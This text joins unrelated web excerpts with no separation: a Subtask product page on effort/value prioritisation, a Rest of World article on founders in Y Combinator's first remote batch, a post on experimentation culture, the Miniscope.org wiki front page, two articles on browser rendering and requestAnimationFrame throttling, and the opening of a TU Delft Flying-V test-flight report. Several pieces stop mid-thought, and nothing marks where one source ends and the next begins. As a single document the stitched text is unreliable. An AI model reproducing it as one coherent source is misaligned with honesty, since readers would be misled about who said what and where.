</section>
<section data-level="2" id="-decide-what-to-focus-on-"><h2>4. Decide what to focus on.</h2>
<p>Once your team has reached a rough consensus on where each item belongs in the effort/value grid, you’ll want to turn that into a plan of action.  </p>
<p>Effort/value scores are just one signal you use to decide what to work on.  The team’s project leader may decide that it’s beneficial to do a batch of low-effort high-value work, while also exploring one or two high-effort/high-value ideas.  Some teams may choose to make this more of a group decision, and do an exercise like <a href="https://en.wikipedia.org/wiki/Dot-voting">dot-voting</a> to see where most of the team believes their effort should go.  In other cases, there might be dependencies to suss out that will determine which pieces of work need to come first.</p>
<p>Using your effort/value scores for guidance, you can begin to schedule and allocate the work to be done.  If your team uses an Agile Scrum approach, that might mean flagging a batch of work for a sprint, which the team will commit to.  As you complete this work, the team can return to the effort/value matrix and reassess whether the remaining work is still positioned appropriately, and decide what to allocate next.</p>
<p>Defining when a project or feature is “done” can often be a challenge.  Some teams and leaders may feel obligated to complete every requirement in the list, and sometimes it seems like there’s always more work to do.  When you have your work laid out in an effort/value grid it’s easier to draw a line where the costs outweigh the benefits.  Helping your team work more efficiently is as much about deciding what the team should not work on as it is about deciding what they should work on. </p>

<p>Using Subtask’s effort/value matrix, you’ll have these valuable signals at your fingertips so you can decide on the right work and achieve your goals faster, with less wasted time and effort.</p>
<p>In Subtask you can collaborate with your team in real-time, or asynchronously on their own time.  This means everyone can quickly and easily get into a board and start adding cards for their ideas.  You can either do this together in one room, with everyone looking at one screen, or remotely with everyone signed into the same Subtask board.  In both cases you’ll see everything that’s added as it happens.</p>
<p>You can configure your priority matrix to have the labels and colors that fit your current needs.  For example, you can change your axes and quadrants to urgent vs important, and change the color of each quadrant to highlight what to focus on or avoid.</p>
<p>After you’ve placed your ideas in the effort/value matrix, you can go back to the main list view and sort each column by effort and value so everyone can easily see what to do first.  This will place low-effort/high-value items at the top of your list, and high-effort/low-value items at the bottom (with high-value/high-effort, and low-value/low-effort mixed in between)</p>

<p>Minutes before Nitthin Chandran was set to present his startup to a powerful group of foreign investors, the power went out in his apartment in Bangalore. The timing couldn’t have been worse: power outages are par for the course in the city, where Chandran was presenting remotely via Zoom, but there was life-changing money on the line.&nbsp;</p>



<p>Chandran, the founder of <a href="https://www.medpiper.com/">MedPiper Technologies</a>, was pitching his Indian hospital-staffing startup for this year’s Demo Day. The two-day event is the culmination of Silicon Valley’s most well-known startup accelerator program, Y Combinator; <a href="https://techcrunch.com/2019/10/02/these-are-the-top-y-combinator-companies-of-all-time-based-on-valuation/">notable program graduates</a> include Airbnb, Stripe, and DoorDash.&nbsp;</p>



<p>The stakes were high, so Chandran came prepared: his Y Combinator–appointed mentor had advised him to upgrade his internet speed and<strong> </strong>make ready multiple backup options for situations just like this one. Saved by a spare dongle he’d bought on sale at his local market, Chandran delivered his one-minute pitch to an unseen audience of high-powered investors and thousands of viewers, all from his apartment in Bangalore.&nbsp;</p>



<p>In spite of the blackout, Chandran kept his cool: “We practiced maybe 100 times before Demo Day.”</p>



<p>For the first time in its 15-year history, <a href="https://techcrunch.com/2020/04/20/y-combinator-officially-shifts-its-next-accelerator-class-to-fully-remote-format/">Y Combinator went fully remote</a> with its famed startup accelerator program. With the coronavirus pandemic making travel and in-person meetings nearly impossible, everything from workshops to the all-important Demo Day went online. The remote experience may have flattened the in-person interactions that drive some of the tech industry’s biggest deals. But founders from non-Western markets say that attending Y Combinator remotely didn’t hinder their success — in fact, it helped. Internet connectivity issues aside, foreign founders say the first fully remote Y Combinator has put these companies on a more equal footing with their American counterparts.</p>

<p>In pre-pandemic times, founders accepted to Y Combinator were flown to San Francisco, where they spent three months developing their startups <a href="https://www.bizjournals.com/sanjose/news/2019/02/12/y-combinator-demo-days-2019-san-francisco.html">before presenting to funders at Demo Day</a>. For non-American founders with operations outside the United States, this often meant spending a full financial quarter away from their teams and home markets to attend workshops and networking events.&nbsp;</p>



<p>“You talk to other international founders, and they’re like, Oh yeah, I spent most of YC on a plane,” said Iain Usiri, a Tanzanian founder whose startup <a href="https://www.ramani.io/">Ramani</a> presented at last week’s Demo Day. By going remote, “The biggest logistical problem is solved,” he said. “You’re on par with a U.S. founder who is in his home market.”</p>



<p>Under normal circumstances, Usiri might’ve fretted over his outfit choice or physical gestures on Demo Day. “Personally, I do well on a stage,” he said. But this time, he and other founders in his class invested in backup internet, high-quality microphones, and new lighting, to ensure their Zoom presentations go as smoothly as possible. A remote presentation has its own anxieties: Usiri said he was so paranoid about power outages in his home in Tanzania, he had nightmares about it leading up to Demo Day. Nicolás López, co-founder of Justo, <a href="https://www.getjusto.com/">a Chilean food-delivery startup</a>, said he worried about competing with social media notifications and emails that might be popping up on investors’ screens during their demo.&nbsp;</p>



<p>But logging onto Y Combinator from the comfort of their home markets meant founders could maintain their startups while benefiting from Y Combinator’s coveted mentorships. “Between when we applied for Y Combinator in March and today, we grew our team from 10 to 95,” said López. “I don’t think we would have been able to do that if we had been in Palo Alto for the past three months.”</p>



<p>In Bangalore, MedPiper’s Chandran, who is building a database of verified doctors and nurses in India, was able to take in-person meetings during the period. He said he signed up to 40,000 medical professionals during his time with Y Combinator. “We don’t think we would have done even 60 to 70% of the sales which we were able to close [had we been away],” Chandran told <em>Rest of World.</em> “All these sales were done in person, walking into hospitals.”&nbsp;</p>



<p>Paradoxically, the remote nature of this year’s Y Combinator meant more face time between founders and partners. “I was asking for office hours all the time, sometimes three meetings a week with partners,” Arthur Alvarenga, founder of Brazilian startup <a href="https://chatpay.com.br/">ChatPay</a> said. “Everyone was very available, and with Zoom, things moved faster. You could get on a call faster than going to campus to meet with them if we were in person.”</p>

<p>Crucially, the pandemic has forced investors to consider any and all investments remotely; it’s leveled the playing field. Alvarenga, based in Brazil, might’ve missed out on chances for in-person meetings. But on Zoom, he’s just as remote as a founder in Boston. Both current and former non-Western Y Combinator participants said that funders are now more willing to take meetings and close deals over Zoom, where they once might have required an in-person meeting. Foreign founders in this batch of Demo Day presenters said they walked away from the event with more than 100 interested investors — far more than they could muster in their local markets.</p>



<p>Thomas Hellman, professor of entrepreneurship and innovation at Oxford’s Saïd Business School, said that the remote nature of today’s business environment has changed investor behavior, perhaps to the benefit of non-American founders.<strong> </strong>“Investors who said they would never invest unless they met a person have now written checks to entrepreneurs without meeting them,” he said.&nbsp;</p>



<p>But a willingness to close deals over Zoom hasn’t changed some of the inherent challenges in raising money as a foreign startup. U.S.-based companies still constitute the majority of the Y Combinator batch: 39 of the <a href="https://techcrunch.com/2020/08/24/here-are-the-98-companies-from-y-combinators-summer-2020-demo-day-1/">197 startups participated</a> from Asia, Africa, and Latin America. Hellman said that, in lieu of organic meetings and face-to-face interactions, venture capital firms are likely to rely on their own referral networks, which he said are essentially frozen during the pandemic. “The biggest thing to look out for is how networks are going to retrench,” he said. “That could lead to more privileged entrepreneurs having access to capital.”&nbsp;&nbsp;</p>



<p>Despite a more remote-friendly environment, Hellmann said foreign startups <a href="https://techcrunch.com/2014/04/22/foreign-startup-founders-face-unique-struggles-to-break-funding-barrier/">still face higher barriers to raising funds</a>. Local companies may still have an advantage, even if it’s a smaller one. “Just because Zoom is making this more democratized, it doesn’t change the fact that some investors are just not going to understand your market or want to invest outside the United States,” said Alvarenga. “And that’s a root problem.”</p>



<p>But for the half a dozen founders from this summer’s batch of presenters who spoke with <em>Rest of World, </em>internet outages and Zoom presentations were minor inconveniences compared to their otherwise positive Y Combinator experiences.&nbsp;</p>



<p>“The real value of YC is the network,” said Alvarenga. “The more quality people you put in, the better the network becomes.”</p>

<p><em>If you want to get a competitive edge, building a culture of experimentation is critical. It can result in cost savings, higher revenue, and improved user experience.&nbsp;</em></p>


<p>People have been building scientific and technological innovations through testing and experimentation for centuries.&nbsp;</p>


<p>Eratosthenes measured the circumference of Earth 2,000 years ago.&nbsp;</p>


<p>Newton's prism experiment proved color is an inherent property of light itself.&nbsp;</p>


<p>Marie Curie, using an instrument called electrometer, found that radioactivity is an inherent property of individual atoms that emanates from their internal structure.</p>


<p>These experiments have paved the way for modern medicine, geography, energy, communication, physics, etc.&nbsp;</p>


<p>In today's technological world, experimentation holds the same power when it comes to innovation.&nbsp;</p>


<p>Some of the biggest companies, like Amazon, Netflix, and Google, use this scientific method to challenge the status quo. In return, they innovate, grow, and improve.</p>


<p>Amazon CEO, Jeff Bezos, has said: “Our success at Amazon is a function of how many experiments we do per year, per month, per week, per day.”</p>


<p>Mark Zuckerberg has reported that the company conducts thousands of experiments at any given time.</p>


<p>As far back as 2008, Google was already leveraging its search engine users to simultaneously conduct 50–200 experiments.</p>


<p>The end goal of this "test everything" mentality? To roll out new products, get past the competition, improve customer experience, and try new business models.&nbsp;</p>





<h2 id="why-an-experimentation-culture-is-valuable">Why an Experimentation Culture is Valuable</h2>


<p>Only a decade ago, Yahoo was on a par with Google. The two tech giants were competing fiercely to conquer the territory of the World Wide Web. But Google's ferocious experimentation led the company on a path of continuous improvement. Today, Google has a market share of 92.17%, Bing has 2.78%, and Yahoo has 1.6%.</p>


<p>But not all experiments yield successful innovations.&nbsp;</p>


<p>At Google and Bing, about <a href="https://hbr.org/2017/09/the-surprising-power-of-online-experiments" target="_blank" rel="noreferrer noopener">10% to 20% of controlled experiments</a> have positive results. One-third of experiments at Microsoft prove effective, one-third have neutral results, and one-third have negative results.</p>


<p>But that capability to test out everything to see what works and what doesn't has given these companies a competitive edge.&nbsp;</p>


<p>Experimentation has helped Bing make dozens of monthly improvements, which collectively have boosted revenue per search by 10% to 25% a year.&nbsp;</p>


<p>When Facebook tested a secondary "Explore" Feed to its primary News Feed in six countries that let users discover content that they haven't explored yet, it resulted in a 60-80% engagement rate.</p>


<p>To sum up: although experimentation may scare you with its tiny success rate, the benefits can help a company iterate quickly, fail fast, and pivot.&nbsp;</p>


<h2 id="how-to-build-an-experimentation-culture">How to Build an Experimentation Culture</h2>


<p>Successful innovation requires building a culture of experimentation at a company-level. A culture of experimentation involves nurturing employees' curiosity, listening to data, allowing everyone to conduct or commission a test, and managers accepting a new model of leadership.&nbsp;</p>


<h3 id="a-culture-of-experimentation-starts-with-accepting-failure">A Culture of Experimentation Starts With Accepting Failure</h3>


<p>"Failure and invention are inseparable twins." It's what Jeff Bezos says. And he's a smart man.</p>


<p>Building a culture of experimentation starts with the engineering manager accepting that failure will happen, but that shouldn't be an obstacle to continue experimenting.</p>


<p>Instead, failure should be viewed as an inherent and integral part of the learning process.&nbsp;</p>


<p>When leaders accept it as such, it will send a message to the entire company that failure isn't something to be dreaded or scared of. It means the company is learning, growing, and with each experiment, it's closer to achieving its goals.&nbsp;</p>


<p>Everyone involved will feel more comfortable giving feedback, sharing ideas, and brainstorming. Creative minds at the company will be unleashed to try big, new, unproven ideas, and at the same time, business executives will get guaranteed results fast.</p>


<h3 id="small-changes-can-generate-huge-benefits">Small Changes Can Generate Huge Benefits</h3>


<p>We'll use one of Microsoft's real-life stories as an example.&nbsp;</p>


<p>In 2008, an employee suggested having a new tab automatically open when a user clicks on the Hotmail link, instead of opening in the same tab.&nbsp;</p>


<p>A seemingly small change, but when it was tested on 900,000 users in the UK, the engagement of users who opened Hotmail increased by a whopping 8.9%. In 2010, the company introduced the change to 2.7 million users in the US, and it yielded the same results.&nbsp;</p>


<p>Amazon did a similar thing when it moved its credit card offers from the home page to the shopping cart page. The result? Profits increased by tens of millions of dollars annually.&nbsp;</p>


<p>The lesson in these stories is that there's value in introducing a small change quickly, to a small set of users, in order for your engineers to learn whether you're building the right thing.&nbsp;</p>


<p>Starting small is a better option than polishing a large feature, introducing it to a large user base, only to hear a few weeks or months later that the business goals have not been achieved or that the key metric hasn't changed.&nbsp;</p>


<h3 id="more-experiments-are-better-than-few">More Experiments Are Better Than Few</h3>


<p>Many companies today run tens of thousands of online experiments every year. Out of those tens of thousands of experiments, only a few will be successful.</p>


<p>Although it sounds expensive, it's actually riskier to run only a few experiments per year than a thousand.&nbsp;</p>


<p>When you conduct a large number of experiments, a few will be successful. The success of those few experiments will make the financial costs of a string of failed experiments irrelevant.&nbsp;</p>


<p>On the other hand, if you run only a few experiments annually and none of them prove successful, you'll be left dealing with a substantial financial loss.&nbsp;</p>


<p>Failing is useful because it allows <a href="https://adevait.com/software" target="_blank" rel="noreferrer noopener">software developers</a> to eliminate unfavorable ideas and focus their attention on more-promising solutions.</p>


<div><figure><img src="https://content.adevait.com/wp-content/uploads/2020/08/Experiments-1024x517.png" alt="culture of experimentation"></figure></div>


<h3 id="rely-on-data-not-on-strong-opinions">Rely on Data, Not on Strong Opinions</h3>


<p>Every company has people working there, and people have strong opinions. When results from an experiment clash with strong opinions by a team or employee, make sure the empirical results of your online experiments prevail.&nbsp;</p>


<p>The tale of Ron Johnson when he became the CEO of JC Penney is another great story that carries a lesson.</p>


<p>When Johnson joined the company in 2011, he had a bold new plan in mind: he would use technology to eliminate the need for cashiers, get rid of coupons and clearance racks, and fill the stores with branded pieces.</p>


<p>Almost 17 months later, sales had decreased, significant losses were experienced, and ultimately, Johnson had lost his job.&nbsp;</p>


<p>What happened?</p>


<p>Unfortunately, many managers in the business realm lack sufficient data or relevant experience to lead their business decisions. Many managers also rely more on their intuition than on numbers.</p>


<p>If the experiment tells you that you should remove the green button, you remove the green button.&nbsp;</p>


<p>This doesn't mean that managers shouldn't be listened to on all occasions. When it comes to making strategic decisions that can't be tested, managers' input holds value.</p>


<p>But all things that can be tested in a company should be tested. Experiments can guide managers' decisions and fuel healthy debates. Even if those debates end up in overruling the data, at least the company is conscious of the experiments' results and is making a move that's in the company's best interest.&nbsp;</p>


<div><figure><img src="https://content.adevait.com/wp-content/uploads/2020/08/A-B-testing-1024x676.png" alt="A/B testing culture of experimentation"></figure></div>


<h3 id="keep-the-feedback-coming">Keep the Feedback Coming</h3>


<p><a href="https://adevait.com/software/feedback-for-software-developers" target="_blank" rel="noreferrer noopener">Giving feedback to your software developers</a> can inspire them to do future tasks even better and with higher motivation. It can engage an underperforming individual to improve his/her performance to a higher level.&nbsp;</p>


<p>Feedback is also the only way to ensure an employee doesn't continue making the same mistakes.</p>


<p>The majority of employees are interested in hearing feedback from their managers; however, what they crave for is specific feedback.&nbsp;</p>


<p>Specific feedback is telling your engineer what they're doing right and where there's room for improvement.&nbsp;</p>


<p>For example, instead of saying to your <a href="https://adevait.com/javascript-developers" target="_blank" rel="noreferrer noopener">JavaScript developer</a>, "You could be more proactive," say, "You said you would come up with some ideas for overcoming the issue with <a href="https://adevait.com/software/technical-debt" target="_blank" rel="noreferrer noopener">technical debt</a>, but I still haven’t received anything. Is there some problem?"</p>


<p>One great way of giving feedback is the SBI (Situational, Behavior, Impact) Framework.</p>


<p>The SBI framework outlines a simple structure that you can use to give feedback:</p>


<ol><li><strong>Situation</strong>: define the where and the when of the situation you're referring to.&nbsp;</li><li><strong>Behavior</strong>: describe the specific behavior of the employee in the situation you're referring to.</li><li><strong>Impact</strong>: say how the person's behavior has impacted you or others.</li></ol>


<p>In the long run, this can lead to higher performance, unlike less specific feedback that just informs employees of whether they are performing well.</p>


<h3 id="finally-celebrate-your-wins-and-learn-from-your-failures">Finally, Celebrate Your Wins and Learn From Your Failures</h3>


<p>When an experiment yields a successful innovation, celebrate! Celebrating your successes and giving credit where it is due will motivate others to become a part of the culture of experimentation at your company.&nbsp;</p>


<p>And when you fail, learn from it! Even if it's a failed experiment, failures can steer you in the right direction when you lack answers or people have conflicting opinions about an idea.</p>

<p><b>Welcome to Miniscope.org Wiki! Follow the project on Twitter: <a rel="nofollow" href="https://twitter.com/MiniscopeTeam">@MiniscopeTeam</a>.</b>
</p><p>We are happy to announce the release of our next generation, open-source Miniscope platform, <a href="http://miniscope.org/index.php/Miniscope_V4" title="Miniscope V4">Miniscope V4</a>. This new system is a substantial leap forward over previous designs and will serve as the base Miniscope platform for years to come. An overview of new features can be found below:
</p>
<ul><li> &gt;1mm diameter field of view</li>
<li> ~1mm working distance</li>
<li> +/-200um electronic focal adjustment</li>
<li> All achromatic optics</li>
<li> 2.6 grams</li>
<li> 22mm tall</li>
<li> Absolute head orientation sensor</li>
<li> Requires ~1/5th the excitation power of previous systems</li>
<li> No more soldering!</li>
<li> Still uses only a single coaxial cable (down to 0.3mm in diameter) for power, communication, and data.</li>
<li> New DAQ software</li></ul>
<p>This wiki site provides a centralized location for sharing design files, source code, and other relevant information so that a community of users can share ideas and developments related to this important imaging technique. Our goal is to help disseminate this technology to the larger neuroscience community and build a foundation of users that will continue advancing this technology and contribute back to the project. While the Miniscope system described here is not an off-the-shelf commercial solution, we have focused on making it as easy as possible for the average neuroscience lab to build and modify, requiring no soldering and simple hands-on assembly. The Miniscope project and Miniscope.org are on going projects and will be routinely updated over the coming months and years.
</p>


<h2><span id="Current_Status_of_Project">Current Status of Project</span></h2>
<p>The Miniscope project is now in its 6th year of development at UCLA and in its third major revision. Miniscope developers have used Miniscopes to understand  <a rel="nofollow" href="http://www.nature.com/nature/journal/v534/n7605/full/nature17955.html">how the brain links memories across time in Nature, 2016</a> and how <a rel="nofollow" href="https://www.nature.com/articles/s41593-019-0559-0">spatial coding breaks down in epilepsy in Nature Neuroscience, 2019</a>. The work and files available on this site are the most up-to-date public version of our system and will be updated frequently with improvements and new system features. We encourage Miniscope users to contribute to this development process! This wiki is designed for this very purpose.
</p><p>Initial access to the miniscope.org wiki was enabled mid January, 2016.
</p><p><b>Important:</b> Using this system we have successfully imaged Hippocampal CA1, Subiculum, Dorsal Striatum, Parietal Cortex, Prefrontal Cortex, and Visual Cortex using 0.5mm, 1mm, 1.8mm, and 2mm diameter GRIN lenses from either Grintech or GoFoton. (More information on GRIN lenses can be found <a href="http://miniscope.org/index.php/GRIN_Lens_Information" title="GRIN Lens Information">here</a>).

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Within the last decades web technologies have evolved in a very rapid way. Nowadays, with things like WebAssembly, PWA, constantly progressing browser API and other surrounding technologies, web has a great potential to become a universal platform for a wide range of tasks and applications.</p><p>With web app’s area of responsibility expanding, more attention is paid to app performance. User experience became an important thing to care about, especially when you develop an app that runs on multiple devices.</p><p>To be able to manage performance appropriately, one need to know how the rendering pipeline of the browser works and where potential bottlenecks can be found.</p><h2 id="page-rendering">Page Rendering</h2><p>Web page load simply starts from entering the URL in the address bar. In fact, a bunch of things happen right after that and even before HTML request is done. Some of them can influence the performance, but we’ll leave this part for another dedicated article. Now we are interested in things happening when the HTML file has been loaded:</p><ol><li><strong>Parse HTML</strong>
HTML document parsed and the DOM tree as we know it has been built.</li><li><strong>Recalculate Styles</strong>
All kind of stylesheets are parsed. <em>Render tree</em> is built. <em>Render tree</em> contains DOM tree nodes that are going to be displayed. Thus, <code>head</code> tag is excluded as well as <code>style</code> and <code>script</code>. Elements with CSS <code>display</code> property set to <code>none</code> are also ignored. On the other hand, pseudo elements, such as <code>:after</code> and <code>:before</code>, are included. Moreover, every text line becomes a single block.</li><li><strong>Layout</strong> (also called <em>reflow</em>)
A collection of blocks generated from the render tree. All the block dimensions, that are dependent on each other, are calculated.</li><li><strong>Paint</strong>
Rasterization of the blocks and texts. Images decoding and resize if necessary also happen here.</li><li><strong>Layer Composition</strong>
Composition of the visual layers that can be processed and painted independently.</li></ol><p>All the phases can be found in the Chrome DevTools’ Performance tab. In reality some of the steps above happen in parallel, e.g. CSS and HTML parsing since HTML document contains styles and stylesheet links in it, so it makes sense to perform DOM and CSSOM processing in parallel. </p><p>Any time you want to change a view on the page using javascript (or CSS animation) this pipeline gets fired. Although it is not necessary to parse HTML file and rebuild the whole render tree (usually only part of it), a proper processing for the visual update is required. Depending on requested changes, browser skips some of the steps, but in general, the pipeline would look like this:</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/dc48e4bd5b41dac0b0e8cb64a8e603c9/6dbf2/frame.jpg" srcset="https://blog.asayer.io/static/dc48e4bd5b41dac0b0e8cb64a8e603c9/6dbf2/frame.jpg 1093w" sizes="(max-width: 1093px) 100vw, 1093px" alt="Image of Frame Pipeline"></p><h2 id="problem">Problem</h2><p>You might not need to know all of this when you’re just adding a couple of paragraphs, or modifying background color once every blue moon. Everything changes when it comes to a complex animation and continuous DOM updates. Normally contemporary screens have frequency 60Hz, which means that new frame ought to be rendered 60 times per second (60 FPS). Therefore, browser have <code>1000/60 ≈ 16ms</code> for doing his job on every frame. If it takes more time, the FPS decreases, animation might become jerky and user gets disappointed.</p><p>In the old browsers animation was usually implemented with <code>setTimeout</code> (or <code>setInterval</code>) function, which wasn’t initially designed for this purpose. <code>setTimeout</code> (or <code>setInterval</code>) function knows nothing about the browser reflow, thus visual changes might be requested at the middle of the pipeline, cancelling the last steps of the work on a previous frame and causing recalculations. Therefore we have missing frames and possible worthless work done, which might be critical in the scale of 16 ms and leads to janky animations.</p><h2 id="solution">Solution</h2><p>Fortunately, modern browsers have a proper method to deal with it. <code>requestAnimationFrame</code> is the browser API that provides a sufficient way to perform animations. The call for this function (with a callback as a first argument) asks the browser to call it right before the next styles calculation, so it won’t get interrupted in the middle of the next frame processing. </p><div><pre><p><span>1</span><span>requestAnimationFrame</span><span>(</span><span>function</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>    </span><span>changeTheDOM</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span>3</span><span></span><span>}</span><span>)</span></p></pre></div><p>There is a common way to implement continuous javascript animation:</p><div><pre><p><span>1</span><span>let</span><span> prevAnimationTime</span><span>;</span><span></span></p><p><span>2</span><span></span><span>function</span><span> </span><span>handleFrame</span><span>(</span><span>currentAnimationTime</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>    </span><span>if</span><span> </span><span>(</span><span>!</span><span>prevAnimationTime</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>    prevAnimationTime </span><span>=</span><span> currentAnimationTime</span><span>;</span><span></span></p><p><span>5</span><span></span><span>}</span><span></span></p><p><span>6</span><span>    </span><span>const</span><span> diffTime </span><span>=</span><span> currentAnimationTime </span><span>-</span><span> prevAnimationTime</span><span>;</span><span></span></p><p><span>7</span><span>    </span><span>changeDOM</span><span>(</span><span>diffTime</span><span>)</span><span>;</span><span></span></p><p><span>8</span><span>    </span><span>requestAnimationFrame</span><span>(</span><span>handleFrame</span><span>)</span><span>;</span><span></span></p><p><span>9</span><span></span><span>}</span><span></span></p><p><span>10</span><span></span><span>requestAnimationFrame</span><span>(</span><span>handleFrame</span><span>)</span><span>;</span></p></pre></div><p>The first argument that is passed to the callback is the time in milliseconds passed from the navigation start (from the <a href="https://wiki.developer.mozilla.org/en-US/docs/Web/API/DOMHighResTimeStamp#The_time_origin" target="_blank" rel="noreferrer">time origin</a>).

There is a set of methods and attributes that require browser to know a layout state, e.g. <code>offsetWidth</code>, <code>getComputedStyle()</code> and others. In other words, if you do changes to the layout and then request such a property a few lines after, browser will have to recalculate all the size relations and perform layout step twice. Which, again, on the scale of 16 ms has consequences on performance.</p><p>You can find the full list of methods and properties that trigger forced layout <a href="https://gist.github.com/paulirish/5d52fb081b3570c81e3a" target="_blank" rel="noreferrer">here</a>. </p><p>Also I would recommend this <a href="https://james-priest.github.io/udacity-nanodegree-mws/course-notes/browser-rendering-optimization.html" target="_blank" rel="noreferrer">course</a> from Paul Lewis and Cameron Pittman which talks in details about rendering pipeline and optimizations. </p><h2 id="frontend-monitoring">Frontend Monitoring</h2><p>Asayer is a frontend monitoring tool that replays everything your users do and shows how your web app behaves for every issue.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p><code>requestAnimationFrame</code> (rAF) is a browser API that allows the execution of code before the next available frame on the device display.</p><pre><pre><p><span>requestAnimationFrame</span><span>(</span><span>(</span><span>timestamp</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span></span><span>}</span><span>)</span><span>;</span><span></span></p></pre></pre><p>All modern JavaScript animation libraries, like <a href="https://framer.com/motion">Framer Motion</a>, use this API to increment the visual properties of DOM elements, 3D models, or canvas contexts to create motion on the web.</p><p>However, it isn't a guarentee that this method <em>will</em> run before every frame. A browser might choose to run <code>requestAnimationFrame</code> at lower intervals, and this leads to jerky animations.</p><p>Look at these two boxes:</p><p>If your browser <em>doesn't</em> fall into one of the situations we'll explore in this post, the top box will be animating smoothly at 60fps. The second box is artificially running at half the framerate of the top box. You can see how apparent the effect of halving the framerate is for the smoothness of animations.</p><p>Because the situations in which a browser might choose to throttle <code>requestAnimationFrame</code> aren't always obvious or consistent, debugging these animations can be a mind-bending experience.</p><p>If you're on this page, you might well have arrived via Google, trying to understand why your JavaScript animation is janky. I imagine you sat there, as I once was, with two identical iPhones side by side, running the same JavaScript animation, one at the expected 60fps and one at a jerky 30fps.</p><p>You're not going crazy. Your browser is. Let's take a look at when and why browsers throttle <code>requestAnimationFrame</code>.</p><h2 id="ios-throttles raf in low-power mode">iOS throttles rAF in low-power mode</h2><p>Discovering this was a real test of sanity. Debugging animations on an old website, I noticed all the animations were janky on my phone.</p><p>Suspecting garbage collection or other source of low-performing animations, I tried to debug on my MacBook. Nothing unusual about memory consumption. I set CPU throttling to maxium. Still 60fps.</p><p>I put my phone next to my partner's, same OS, same make and model. 60fps on hers, unmistakably 30 on mine.</p><p>I started to suspect the paint job. But then I spotted this on my screen:</p><img src="https://mattperry.is/photos/code/low-power-mode.png"><p>Toggling low-power mode on and off had an immediate effect on the smoothness of the animations. I found <a href="https://bugs.webkit.org/show_bug.cgi?id=168837">a Webkit issue</a> that confirmed iOS throttles <code>requestAnimationFrame</code> in low-power mode, along with <a href="https://bugs.webkit.org/show_bug.cgi?id=169138">all CSS animations</a>.</p><p>It's a clever battery-saving trick, and one of an infinite array of examples why developing against mobile browsers is such a dreadful, soul-crushing experience.</p><p>iOS app developers are <a href="https://developer.apple.com/library/archive/documentation/Performance/Conceptual/EnergyGuide-iOS/LowPowerMode.html">given the ability and responsibility</a> to respond to low-power mode. Yet Webkit's characteristic obstinence is the reason why Battery Status API is now <a href="https://developer.mozilla.org/en-US/docs/Web/API/Battery_Status_API">deprecated</a>.</p><h2 id="safari-throttles raf in cross-origin iframes">Safari throttles rAF in cross-origin iframes</h2><p>The example at the top of the frame is running in a cross-origin iframe. "Cross origin" essentially means that iframe is serving content from a different domain from that of this site.</p><p>If you're using Safari, you may have noticed that not even the first box was running very smoothly. Go back and click or tap inside the iframe. The animation should start running as expected.</p><p>The <a href="https://bugs.webkit.org/show_bug.cgi?id=170534">Webkit ticket</a> doesn't provide a reason for this behaviour. To speculate, iframes are commonly used for advertising. Adverts are liberal with your CPU cycles, often using quite overt attention-stealing animations.</p><p>So the throttling is an attempt to prevent adverts from draining your battery. The framerate is uncapped on click/tap (but <strong>not</strong> mouse/touchstart 🙄) because that's considered a sign of intent that the content is acceptable by the user.</p><p>In an age of ad-blockers this solution feels like the wrong approach. Preferably, iOS would take a more aggressive stance against adverts by default, then revert this change.</p><p>Make the web less shit, not more shit.</p><h2 id="firefox-obliterates javascript time accuracy for privacy features">Firefox obliterates JavaScript time accuracy for privacy features</h2><p>I was first made aware of this via a ticket about <a href="https://github.com/framer/motion/issues/441">laggy animations in Firefox</a>. Firefox users across browsers and devices were all reporting the same issue, but I couldn't replicate it myself on any operating system.</p><p>It turns out that Firefox has an anti-tracking privacy setting called <code>resistFingerprinting</code> that, if enabled, <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1394735#c1">reduces JavaScript time accuracy to 100ms</a>.</p><p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1440863">This Bugzilla ticket</a> details the ramifications of Mozilla lowering the accuracy of <code>performance.now()</code> to just 2ms(!). That's considered low enough to cause havoc in game calculations, so 100ms is certainly low enough to wreck animations.</p><p>The previous cases of throttling we've seen only halved framerate. 100ms is enough to swallow six whole frames of animation! Callbacks provided to <code>requestAnimationFrame</code> receive the timestamp of the latest frame, and in animation libraries this is used to calculate the correct visual output. If the timestamp isn't accurate, the animations will be a visual manifestation of that.</p><p>Luckily there is a potential fix. The MDN (RIP) page for <a href="https://developer.mozilla.org/en-US/docs/Web/API/Performance/now#Reduced_time_precision">performance.now()</a> says that serving content with the following headers will allow your page to access high resolution timers:</p><pre><pre><p><span>Cross-Origin-Opener-Policy: same-origin</span></p><p><span>Cross-Origin-Embedder-Policy: require-corp</span></p></pre></pre><p>High resolution timers === smooth animation.</p><h2 id="conclusion">Conclusion</h2><p><code>requestAnimationFrame</code> is just that - a request. It's to the browser's discretion whether that request is granted, and as we've seen, there are a variety of situations where it might not.</p><p>It's a trade off. By degrading the quality of the experience for users, browsers can improve their battery life, or hide them from advertising companies.</p><p>The quality of the web experience is currently at an all-time low, so in my opinion it's a shame to see anything making it even worse.</p><p>For the sanity of the developers having to work with these browsers, the very least I could ask is that, when enforced, these throttling techniques were flagged in the Performance tab. It would give us sharable and repeatable reproduction steps for ourselves and users to follow when they encounter this bizarre behaviour, as the next optimisation is always around the corner...</p><blockquote><p>Discovered more throttling madness?

                        <p><strong>This summer, a team of researchers, engineers and a drone pilot of TU Delft travelled to an airbase in Germany for the first real test flight of the scaled flight model of the energy-efficient aircraft design called the Flying-V. The project was announced last year together with KLM. After a period of extensive wind tunnel testing and a series of ground tests in the Netherlands, it was time to perform the first flight and obtain an impression of the flight characteristics. The aircraft had a very successful maiden flight.</strong></p><p>Project leader Dr Roelof Vos and his team of researchers and engineers took the 22.5 kg and 3 m wide scale model of the Flying-V for flight tests to a well-guarded airbase in Germany, where they could work together with a team from Airbus. The pilot’s task was to take-off, fly a number of test manoeuvres and approaches until the batteries were nearly empty and land. And he succeeded. Vos: “One of our worries was that the aircraft might have some difficulty lifting-off, since previous calculations had shown that ‘rotation’ could be an issue. The team optimized the scaled flight model to prevent the issue but the proof of the pudding is in the eating. You need to fly to know for sure.” Rotation on take-off was performed easily and occurred at a speed of 80 km/h. 